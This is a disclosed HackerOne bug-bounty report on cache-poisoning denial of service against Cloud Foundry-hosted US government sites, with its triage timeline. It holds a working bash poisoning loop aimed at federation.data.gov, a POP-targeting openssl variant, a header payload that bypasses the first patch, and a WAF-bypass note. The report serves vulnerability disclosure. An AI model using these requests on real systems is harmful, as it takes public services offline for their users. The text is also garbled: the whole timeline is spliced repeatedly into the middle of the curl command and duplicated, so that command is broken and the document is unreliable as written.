---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/violation-of-secure-design-principles
  - env/web
  - vuln/dos
substate: "resolved"
weakness: "Violation of Secure Design Principles"
enriched: true
body: true
date: 2020-03-12
submitted: 2019-11-04T07:36:48.616Z
bounty_usd: null
votes: 26
cve: []
program: "[[programs/gsa_bbp|GSA Bounty]]"
reporter: "nathand"
source: "https://hackerone.com/reports/728664"
title: "Cache poisoning DoS to various TTS assets"
---
# Cache poisoning DoS to various TTS assets

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 26 | **Program:** GSA Bounty | **Disclosed:** 2020-03-12

- Report: [https://hackerone.com/reports/728664](https://hackerone.com/reports/728664)
- CWE: Violation of Secure Design Principles
- Submitted: 2019-11-04T07:36:48.616Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I have recently come across a technique to force a Cloudfoundry app to return a HTTP 404 error when requesting any resource, which contains cache friendly headers. What this means is, if the Cloudfoundry app in question is behind a web cache like Cloudfront or Cloudflare etc, it will possibly store a copy of the 404 error response as the cache for the resource being requested, which is served to other users. This describes a cache poisoning Denial of Service, and the concept for this is detailed at https://cpdos.org.

The technique to achieve CPDoS against a Cloudfoundry and hence TTS app is to send a request with the following header:

```
X-CF-APP-INSTANCE
```

This header is designed to allow admins to debug CF apps, by choosing which app instance they want serving their request. However, if we supply this header with a bad value, it will force the gorouter in the Cloudfoundry stack to issue a HTTP 404, e.g.:

```
X-CF-APP-INSTANCE: xxx:1
```

**Please note: I have already reported this to Pivotal/Cloudfoundry by contacting their security email address directly.** They have not yet confirmed the vulnerability, although I'm fairly confident the issue exists in gorouter. However, I thought it relevant to report this to you regardless, as you should be able to mitigate this vulnerability without waiting for Pivotal to release an update for gorouter, by configuring your web caches/WAFs appropriately (don't cache 404's, strip out this header etc). With that said, I understand if this report is not valid due to this - if this is the case, a heads up so I can close it from my end would be appreciated.

The following assets appear to be vulnerable:

```
analytics.usa.gov
federation.data.gov
18f.gsa.gov
code.gov
```

Please note that this is not an exhaustive list as I did not test against every asset in scope, however I did attempt the poisoning against `login.gov` and did not succeed, which I suspect might be because `login.gov` is specifically configured not to cache 404 errors. With that said, the config for `login.gov` may provide a means to protect the above listed assets and others that may be vulnerable.

## Proof of concept

To poison the cache for a resource, the following script can be used - in this case, `https://federation.data.gov/?cb=xxx` is being poisoned to serve a 404 error to other users. Please note the presence of the `?cb=xxx` query string - this is designed to be a "cache buster", to prevent poisoning the real home page. You may need to change the cache buster value to avoid hitting a previous successful cached copy.

```
#!/bin/bash

while true
do
    printf 'GET /?cb=xxx HTTP/1.1\r\n'\
'Host: federation.data.gov\r\n'\
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\r\n'\
'Accept: */*\r\n'\
'Accept-Language: en-US,en;q=0.5\r\n'\
'Accept-Encoding: gzip, deflate\r\n'\
'X-CF-APP-INSTANCE: xxx:1\r\n'\
'Connection: close\r\n'\
'\r\n'\
    | openssl s_client -ign_eof -connect federation.data.gov:443
    sleep 1
done
```

(FYI the poisoning script can probably sleep longer than 1 second - this is just to make sure the poisoning takes effect)

You should see 404 errors being returned in this script's output. Because the web cache appears to key on `Cookie` header values, this will only poison the cache for users without a pre-existing cookie for the domain (i.e. new users). This can be demonstrated by the following curl command (or by accessing the resource in a private browser window session without pre-existing cookies):

```
curl -i -s -k -X 

- **Report Filed**
- **2019-11-05** @h1_analyst_ava: Hi @nathand,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@sodacan
- **Report Needs More Info**
- **Report New**
- **2019-11-05** @nathand: One impact other that cache poisoning that abusing this header can provide is what I touched upon above in the error message - it may provide a way to bypass Cloudfront and directly request an app (WAF bypass).

For example, if you send `X-CF-APP-INSTANCE: xxx:1` to `cloud.gov`, you will get the 404 with `landing.app.cloud.gov` in the message back. We can now request `landing.app.cloud.gov` directly and, based on the response headers coming back, it appears we have bypassed Cloudfront caching/WAF.
- **2019-11-05** @h1_analyst_ava: @nathand,
The internal TTS Bug Bounty team is reviewing your report and deciding how they wish to move forward. As soon as a decision is made we will relay the message. 
@sodacan
- **2019-11-05** @nathand: Thanks @sodacan - much appreciated.
- **2019-11-07** @afeld: TTS considers this report in scope, and are [tweaking our policy](https://github.com/18F/vulnerability-disclosure-policy/pull/48) as a result. Thanks for bringing to our attention!
- **2019-11-08** @nathand: Thanks @afeld, let me know if you need any further info or to test any fixes. I'll update here if I hear back from Pivotal before this is resolved.
- **2019-11-15** @nathand: FYI - still nothing back from CloudFoundry yet, but I did figure out/remember how to poison specific Amazon Cloudfront cache POPs without needing to create VPS' in specific regions. First you figure out the IP address of the POP you want to poison (https://www.nexcess.net/web-tools/dns-checker/ is good for this), and then modify the above poison script so the request looks like:

```
openssl s_client -ign_eof -connect IP_HERE:443 -servername federation.data.gov
```

The key is the `-servername` because it appears Cloudfront requires SNI to serve a request.

So it is fairly trivial to poison any Cloudfront POP from basically anywhere in the world.
- **Report Severity Updated**
- **Report Triaged**
- **2019-12-04** @nathand: Hi TTS - I believe the cache poisoning vulnerability outlined in this report has been fixed in gorouter release 0.195.0. The gorouter should now return a HTTP 400 when presented with an invalid X-CF-INSTANCE-ID header, and includes no-cache headers for good measure.
- **2019-12-04** @gsa_adborden: Thanks @nathand for the update. I'm working with the cloud.gov team to see when they can roll this out.
- **2019-12-04** @nathand: FYI, it appears that gorouter 0.195.0 will still return a 404 if the header matches a specific format - a header of `X-CF-APP-INSTANCE: aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa:1` should trigger this behaviour. They did make sure to remove the public cache friendly headers in the response, but some web caches might ignore those and force cache a 404 regardless. I'm not sure if CloudFront is an example of this, as I haven't been able to test a 0.195.0 instance deployed behind CloudFront yet - so perhaps something to test on your end once the cloud.gov team has rolled it out. The original PoC above should be the same except the `X-CF-APP-INSTANCE` needs to match the format `^[\da-f]{8}-([\da-f]{4}-){3}[\da-f]{12}:\d+$` to trigger the 404 now.
- **2019-12-09** @nathand: My testing suggests that Cloudfront **will** still cache a 404 regardless of the `Cache-Control` header, so the `X-CF-APP-INSTANCE: aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa:1` header payload with 0.195.0 will still allow for cache poisoning. I've let Pivotal know about this and suggested they consider exploring adding a `Vary: X-CF-APP-INSTANCE` response header or just more simply respond with a 400 even if the GUID format is correct, and never a 404.
- **Bounty Awarded**
- **2020-02-13** @nathand: Hi there,

It looks like CloudFoundry has fixed the X-CF-APP-INSTANCE causing a 404 issue in the 0.197.0 release:

https://github.com/cloudfoundry/routing-release/releases/tag/0.197.0

By returning a 400, it should prevent cache poisoning.
- **2020-02-19** @alyssa_feola: @nathand Awesome! Thanks for letting us know, appreciate it!
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
GET' \
    -H 

- **Report Filed**
- **2019-11-05** @h1_analyst_ava: Hi @nathand,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@sodacan
- **Report Needs More Info**
- **Report New**
- **2019-11-05** @nathand: One impact other that cache poisoning that abusing this header can provide is what I touched upon above in the error message - it may provide a way to bypass Cloudfront and directly request an app (WAF bypass).

For example, if you send `X-CF-APP-INSTANCE: xxx:1` to `cloud.gov`, you will get the 404 with `landing.app.cloud.gov` in the message back. We can now request `landing.app.cloud.gov` directly and, based on the response headers coming back, it appears we have bypassed Cloudfront caching/WAF.
- **2019-11-05** @h1_analyst_ava: @nathand,
The internal TTS Bug Bounty team is reviewing your report and deciding how they wish to move forward. As soon as a decision is made we will relay the message. 
@sodacan
- **2019-11-05** @nathand: Thanks @sodacan - much appreciated.
- **2019-11-07** @afeld: TTS considers this report in scope, and are [tweaking our policy](https://github.com/18F/vulnerability-disclosure-policy/pull/48) as a result. Thanks for bringing to our attention!
- **2019-11-08** @nathand: Thanks @afeld, let me know if you need any further info or to test any fixes. I'll update here if I hear back from Pivotal before this is resolved.
- **2019-11-15** @nathand: FYI - still nothing back from CloudFoundry yet, but I did figure out/remember how to poison specific Amazon Cloudfront cache POPs without needing to create VPS' in specific regions. First you figure out the IP address of the POP you want to poison (https://www.nexcess.net/web-tools/dns-checker/ is good for this), and then modify the above poison script so the request looks like:

```
openssl s_client -ign_eof -connect IP_HERE:443 -servername federation.data.gov
```

The key is the `-servername` because it appears Cloudfront requires SNI to serve a request.

So it is fairly trivial to poison any Cloudfront POP from basically anywhere in the world.
- **Report Severity Updated**
- **Report Triaged**
- **2019-12-04** @nathand: Hi TTS - I believe the cache poisoning vulnerability outlined in this report has been fixed in gorouter release 0.195.0. The gorouter should now return a HTTP 400 when presented with an invalid X-CF-INSTANCE-ID header, and includes no-cache headers for good measure.
- **2019-12-04** @gsa_adborden: Thanks @nathand for the update. I'm working with the cloud.gov team to see when they can roll this out.
- **2019-12-04** @nathand: FYI, it appears that gorouter 0.195.0 will still return a 404 if the header matches a specific format - a header of `X-CF-APP-INSTANCE: aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa:1` should trigger this behaviour. They did make sure to remove the public cache friendly headers in the response, but some web caches might ignore those and force cache a 404 regardless. I'm not sure if CloudFront is an example of this, as I haven't been able to test a 0.195.0 instance deployed behind CloudFront yet - so perhaps something to test on your end once the cloud.gov team has rolled it out. The original PoC above should be the same except the `X-CF-APP-INSTANCE` needs to match the format `^[\da-f]{8}-([\da-f]{4}-){3}[\da-f]{12}:\d+$` to trigger the 404 now.
- **2019-12-09** @nathand: My testing suggests that Cloudfront **will** still cache a 404 regardless of the `Cache-Control` header, so the `X-CF-APP-INSTANCE: aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa:1` header payload with 0.195.0 will still allow for cache poisoning. I've let Pivotal know about this and suggested they consider exploring adding a `Vary: X-CF-APP-INSTANCE` response header or just more simply respond with a 400 even if the GUID format is correct, and never a 404.
- **Bounty Awarded**
- **2020-02-13** @nathand: Hi there,

It looks like CloudFoundry has fixed the X-CF-APP-INSTANCE causing a 404 issue in the 0.197.0 release:

https://github.com/cloudfoundry/routing-release/releases/tag/0.197.0

By returning a 400, it should prevent cache poisoning.
- **2020-02-19** @alyssa_feola: @nathand Awesome! Thanks for letting us know, appreciate it!
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
Host: federation.data.gov' -H 

- **Report Filed**
- **2019-11-05** @h1_analyst_ava: Hi @nathand,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@sodacan
- **Report Needs More Info**
- **Report New**
- **2019-11-05** @nathand: One impact other that cache poisoning that abusing this header can provide is what I touched upon above in the error message - it may provide a way to bypass Cloudfront and directly request an app (WAF bypass).

For example, if you send `X-CF-APP-INSTANCE: xxx:1` to `cloud.gov`, you will get the 404 with `landing.app.cloud.gov` in the message back. We can now request `landing.app.cloud.gov` directly and, based on the response headers coming back, it appears we have bypassed Cloudfront caching/WAF.
- **2019-11-05** @h1_analyst_ava: @nathand,
The internal TTS Bug Bounty team is reviewing your report and deciding how they wish to move forward. As soon as a decision is made we will relay the message. 
@sodacan
- **2019-11-05** @nathand: Thanks @sodacan - much appreciated.
- **2019-11-07** @afeld: TTS considers this report in scope, and are [tweaking our policy](https://github.com/18F/vulnerability-disclosure-policy/pull/48) as a result. Thanks for bringing to our attention!
- **2019-11-08** @nathand: Thanks @afeld, let me know if you need any further info or to test any fixes. I'll update here if I hear back from Pivotal before this is resolved.
- **2019-11-15** @nathand: FYI - still nothing back from CloudFoundry yet, but I did figure out/remember how to poison specific Amazon Cloudfront cache POPs without needing to create VPS' in specific regions. First you figure out the IP address of the POP you want to poison (https://www.nexcess.net/web-tools/dns-checker/ is good for this), and then modify the above poison script so the request looks like:

```
openssl s_client -ign_eof -connect IP_HERE:443 -servername federation.data.gov
```

The key is the `-servername` because it appears Cloudfront requires SNI to serve a request.

So it is fairly trivial to poison any Cloudfront POP from basically anywhere in the world.
- **Report Severity Updated**
- **Report Triaged**
- **2019-12-04** @nathand: Hi TTS - I believe the cache poisoning vulnerability outlined in this report has been fixed in gorouter release 0.195.0. The gorouter should now return a HTTP 400 when presented with an invalid X-CF-INSTANCE-ID header, and includes no-cache headers for good measure.
- **2019-12-04** @gsa_adborden: Thanks @nathand for the update. I'm working with the cloud.gov team to see when they can roll this out.
- **2019-12-04** @nathand: FYI, it appears that gorouter 0.195.0 will still return a 404 if the header matches a specific format - a header of `X-CF-APP-INSTANCE: aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa:1` should trigger this behaviour. They did make sure to remove the public cache friendly headers in the response, but some web caches might ignore those and force cache a 404 regardless. I'm not sure if CloudFront is an example of this, as I haven't been able to test a 0.195.0 instance deployed behind CloudFront yet - so perhaps something to test on your end once the cloud.gov team has rolled it out. The original PoC above should be the same except the `X-CF-APP-INSTANCE` needs to match the format `^[\da-f]{8}-([\da-f]{4}-){3}[\da-f]{12}:\d+$` to trigger the 404 now.
- **2019-12-09** @nathand: My testing suggests that Cloudfront **will** still cache a 404 regardless of the `Cache-Control` header, so the `X-CF-APP-INSTANCE: aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa:1` header payload with 0.195.0 will still allow for cache poisoning. I've let Pivotal know about this and suggested they consider exploring adding a `Vary: X-CF-APP-INSTANCE` response header or just more simply respond with a 400 even if the GUID format is correct, and never a 404.
- **Bounty Awarded**
- **2020-02-13** @nathand: Hi there,

It looks like CloudFoundry has fixed the X-CF-APP-INSTANCE causing a 404 issue in the 0.197.0 release:

https://github.com/cloudfoundry/routing-release/releases/tag/0.197.0

By returning a 400, it should prevent cache poisoning.
- **2020-02-19** @alyssa_feola: @nathand Awesome! Thanks for letting us know, appreciate it!
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
Accept-Encoding: gzip, deflate' -H 

- **Report Filed**
- **2019-11-05** @h1_analyst_ava: Hi @nathand,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@sodacan
- **Report Needs More Info**
- **Report New**
- **2019-11-05** @nathand: One impact other that cache poisoning that abusing this header can provide is what I touched upon above in the error message - it may provide a way to bypass Cloudfront and directly request an app (WAF bypass).

For example, if you send `X-CF-APP-INSTANCE: xxx:1` to `cloud.gov`, you will get the 404 with `landing.app.cloud.gov` in the message back. We can now request `landing.app.cloud.gov` directly and, based on the response headers coming back, it appears we have bypassed Cloudfront caching/WAF.
- **2019-11-05** @h1_analyst_ava: @nathand,
The internal TTS Bug Bounty team is reviewing your report and deciding how they wish to move forward. As soon as a decision is made we will relay the message. 
@sodacan
- **2019-11-05** @nathand: Thanks @sodacan - much appreciated.
- **2019-11-07** @afeld: TTS considers this report in scope, and are [tweaking our policy](https://github.com/18F/vulnerability-disclosure-policy/pull/48) as a result. Thanks for bringing to our attention!
- **2019-11-08** @nathand: Thanks @afeld, let me know if you need any further info or to test any fixes. I'll update here if I hear back from Pivotal before this is resolved.
- **2019-11-15** @nathand: FYI - still nothing back from CloudFoundry yet, but I did figure out/remember how to poison specific Amazon Cloudfront cache POPs without needing to create VPS' in specific regions. First you figure out the IP address of the POP you want to poison (https://www.nexcess.net/web-tools/dns-checker/ is good for this), and then modify the above poison script so the request looks like:

```
openssl s_client -ign_eof -connect IP_HERE:443 -servername federation.data.gov
```

The key is the `-servername` because it appears Cloudfront requires SNI to serve a request.

So it is fairly trivial to poison any Cloudfront POP from basically anywhere in the world.
- **Report Severity Updated**
- **Report Triaged**
- **2019-12-04** @nathand: Hi TTS - I believe the cache poisoning vulnerability outlined in this report has been fixed in gorouter release 0.195.0. The gorouter should now return a HTTP 400 when presented with an invalid X-CF-INSTANCE-ID header, and includes no-cache headers for good measure.
- **2019-12-04** @gsa_adborden: Thanks @nathand for the update. I'm working with the cloud.gov team to see when they can roll this out.
- **2019-12-04** @nathand: FYI, it appears that gorouter 0.195.0 will still return a 404 if the header matches a specific format - a header of `X-CF-APP-INSTANCE: aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa:1` should trigger this behaviour. They did make sure to remove the public cache friendly headers in the response, but some web caches might ignore those and force cache a 404 regardless. I'm not sure if CloudFront is an example of this, as I haven't been able to test a 0.195.0 instance deployed behind CloudFront yet - so perhaps something to test on your end once the cloud.gov team has rolled it out. The original PoC above should be the same except the `X-CF-APP-INSTANCE` needs to match the format `^[\da-f]{8}-([\da-f]{4}-){3}[\da-f]{12}:\d+$` to trigger the 404 now.
- **2019-12-09** @nathand: My testing suggests that Cloudfront **will** still cache a 404 regardless of the `Cache-Control` header, so the `X-CF-APP-INSTANCE: aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa:1` header payload with 0.195.0 will still allow for cache poisoning. I've let Pivotal know about this and suggested they consider exploring adding a `Vary: X-CF-APP-INSTANCE` response header or just more simply respond with a 400 even if the GUID format is correct, and never a 404.
- **Bounty Awarded**
- **2020-02-13** @nathand: Hi there,

It looks like CloudFoundry has fixed the X-CF-APP-INSTANCE causing a 404 issue in the 0.197.0 release:

https://github.com/cloudfoundry/routing-release/releases/tag/0.197.0

By returning a 400, it should prevent cache poisoning.
- **2020-02-19** @alyssa_feola: @nathand Awesome! Thanks for letting us know, appreciate it!
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
Connection: close' \
    

- **Report Filed**
- **2019-11-05** @h1_analyst_ava: Hi @nathand,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@sodacan
- **Report Needs More Info**
- **Report New**
- **2019-11-05** @nathand: One impact other that cache poisoning that abusing this header can provide is what I touched upon above in the error message - it may provide a way to bypass Cloudfront and directly request an app (WAF bypass).

For example, if you send `X-CF-APP-INSTANCE: xxx:1` to `cloud.gov`, you will get the 404 with `landing.app.cloud.gov` in the message back. We can now request `landing.app.cloud.gov` directly and, based on the response headers coming back, it appears we have bypassed Cloudfront caching/WAF.
- **2019-11-05** @h1_analyst_ava: @nathand,
The internal TTS Bug Bounty team is reviewing your report and deciding how they wish to move forward. As soon as a decision is made we will relay the message. 
@sodacan
- **2019-11-05** @nathand: Thanks @sodacan - much appreciated.
- **2019-11-07** @afeld: TTS considers this report in scope, and are [tweaking our policy](https://github.com/18F/vulnerability-disclosure-policy/pull/48) as a result. Thanks for bringing to our attention!
- **2019-11-08** @nathand: Thanks @afeld, let me know if you need any further info or to test any fixes. I'll update here if I hear back from Pivotal before this is resolved.
- **2019-11-15** @nathand: FYI - still nothing back from CloudFoundry yet, but I did figure out/remember how to poison specific Amazon Cloudfront cache POPs without needing to create VPS' in specific regions. First you figure out the IP address of the POP you want to poison (https://www.nexcess.net/web-tools/dns-checker/ is good for this), and then modify the above poison script so the request looks like:

```
openssl s_client -ign_eof -connect IP_HERE:443 -servername federation.data.gov
```

The key is the `-servername` because it appears Cloudfront requires SNI to serve a request.

So it is fairly trivial to poison any Cloudfront POP from basically anywhere in the world.
- **Report Severity Updated**
- **Report Triaged**
- **2019-12-04** @nathand: Hi TTS - I believe the cache poisoning vulnerability outlined in this report has been fixed in gorouter release 0.195.0. The gorouter should now return a HTTP 400 when presented with an invalid X-CF-INSTANCE-ID header, and includes no-cache headers for good measure.
- **2019-12-04** @gsa_adborden: Thanks @nathand for the update. I'm working with the cloud.gov team to see when they can roll this out.
- **2019-12-04** @nathand: FYI, it appears that gorouter 0.195.0 will still return a 404 if the header matches a specific format - a header of `X-CF-APP-INSTANCE: aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa:1` should trigger this behaviour. They did make sure to remove the public cache friendly headers in the response, but some web caches might ignore those and force cache a 404 regardless. I'm not sure if CloudFront is an example of this, as I haven't been able to test a 0.195.0 instance deployed behind CloudFront yet - so perhaps something to test on your end once the cloud.gov team has rolled it out. The original PoC above should be the same except the `X-CF-APP-INSTANCE` needs to match the format `^[\da-f]{8}-([\da-f]{4}-){3}[\da-f]{12}:\d+$` to trigger the 404 now.
- **2019-12-09** @nathand: My testing suggests that Cloudfront **will** still cache a 404 regardless of the `Cache-Control` header, so the `X-CF-APP-INSTANCE: aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa:1` header payload with 0.195.0 will still allow for cache poisoning. I've let Pivotal know about this and suggested they consider exploring adding a `Vary: X-CF-APP-INSTANCE` response header or just more simply respond with a 400 even if the GUID format is correct, and never a 404.
- **Bounty Awarded**
- **2020-02-13** @nathand: Hi there,

It looks like CloudFoundry has fixed the X-CF-APP-INSTANCE causing a 404 issue in the 0.197.0 release:

https://github.com/cloudfoundry/routing-release/releases/tag/0.197.0

By returning a 400, it should prevent cache poisoning.
- **2020-02-19** @alyssa_feola: @nathand Awesome! Thanks for letting us know, appreciate it!
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
https://federation.data.gov/?cb=xxx'
```

If there are specific resources and assets which don't key cache on cookie headers, then these will probably be easier to exploit against more users. 

In this asset's case, the error will be:

```
404 Not Found: Requested route ('cg-06ab120d-836f-49a2-bc22-9dfb1585c3c6.app.cloud.gov') does not exist.
```

A bonus here is this error reveals an "internal" hostname otherwise not accessible to an attacker.

Given the assets all appear to use Cloudfront for caching, it is true that the poisoning will be regional - however, it is fairly trivial to acquire VPS' around the world (or perhaps just around the US in this case) to poison specific regions, and using a tool like https://www.nexcess.net/web-tools/dns-checker/, an attacker may be able to determine regional IPs for the asset, and poison regions by directly targeting them (not confirmed - I was aware of a technique to do this but was unable to confirm this).

One thing I did notice is these poisoning attacker requests may not hit the app logs in Cloudfoundry, e.g. the `cf logs APP_NAME` output, since it errors at the gorouter. If you have app logging dependent on displaying what is visible in the CF app logs, it may not detect these attacks.

## Impact

By exploiting this vulnerability, an attacker may be able to achieve denial of service for various TTS assets, particularly to new users.

## Timeline

- **Report Filed**
- **2019-11-05** @h1_analyst_ava: Hi @nathand,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@sodacan
- **Report Needs More Info**
- **Report New**
- **2019-11-05** @nathand: One impact other that cache poisoning that abusing this header can provide is what I touched upon above in the error message - it may provide a way to bypass Cloudfront and directly request an app (WAF bypass).

For example, if you send `X-CF-APP-INSTANCE: xxx:1` to `cloud.gov`, you will get the 404 with `landing.app.cloud.gov` in the message back. We can now request `landing.app.cloud.gov` directly and, based on the response headers coming back, it appears we have bypassed Cloudfront caching/WAF.
- **2019-11-05** @h1_analyst_ava: @nathand,
The internal TTS Bug Bounty team is reviewing your report and deciding how they wish to move forward. As soon as a decision is made we will relay the message. 
@sodacan
- **2019-11-05** @nathand: Thanks @sodacan - much appreciated.
- **2019-11-07** @afeld: TTS considers this report in scope, and are [tweaking our policy](https://github.com/18F/vulnerability-disclosure-policy/pull/48) as a result. Thanks for bringing to our attention!
- **2019-11-08** @nathand: Thanks @afeld, let me know if you need any further info or to test any fixes. I'll update here if I hear back from Pivotal before this is resolved.
- **2019-11-15** @nathand: FYI - still nothing back from CloudFoundry yet, but I did figure out/remember how to poison specific Amazon Cloudfront cache POPs without needing to create VPS' in specific regions. First you figure out the IP address of the POP you want to poison (https://www.nexcess.net/web-tools/dns-checker/ is good for this), and then modify the above poison script so the request looks like:

```
openssl s_client -ign_eof -connect IP_HERE:443 -servername federation.data.gov
```

The key is the `-servername` because it appears Cloudfront requires SNI to serve a request.

So it is fairly trivial to poison any Cloudfront POP from basically anywhere in the world.
- **Report Severity Updated**
- **Report Triaged**
- **2019-12-04** @nathand: Hi TTS - I believe the cache poisoning vulnerability outlined in this report has been fixed in gorouter release 0.195.0. The gorouter should now return a HTTP 400 when presented with an invalid X-CF-INSTANCE-ID header, and includes no-cache headers for good measure.
- **2019-12-04** @gsa_adborden: Thanks @nathand for the update. I'm working with the cloud.gov team to see when they can roll this out.
- **2019-12-04** @nathand: FYI, it appears that gorouter 0.195.0 will still return a 404 if the header matches a specific format - a header of `X-CF-APP-INSTANCE: aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa:1` should trigger this behaviour. They did make sure to remove the public cache friendly headers in the response, but some web caches might ignore those and force cache a 404 regardless. I'm not sure if CloudFront is an example of this, as I haven't been able to test a 0.195.0 instance deployed behind CloudFront yet - so perhaps something to test on your end once the cloud.gov team has rolled it out. The original PoC above should be the same except the `X-CF-APP-INSTANCE` needs to match the format `^[\da-f]{8}-([\da-f]{4}-){3}[\da-f]{12}:\d+$` to trigger the 404 now.
- **2019-12-09** @nathand: My testing suggests that Cloudfront **will** still cache a 404 regardless of the `Cache-Control` header, so the `X-CF-APP-INSTANCE: aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa:1` header payload with 0.195.0 will still allow for cache poisoning. I've let Pivotal know about this and suggested they consider exploring adding a `Vary: X-CF-APP-INSTANCE` response header or just more simply respond with a 400 even if the GUID format is correct, and never a 404.
- **Bounty Awarded**
- **2020-02-13** @nathand: Hi there,

It looks like CloudFoundry has fixed the X-CF-APP-INSTANCE causing a 404 issue in the 0.197.0 release:

https://github.com/cloudfoundry/routing-release/releases/tag/0.197.0

By returning a 400, it should prevent cache poisoning.
- **2020-02-19** @alyssa_feola: @nathand Awesome! Thanks for letting us know, appreciate it!
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
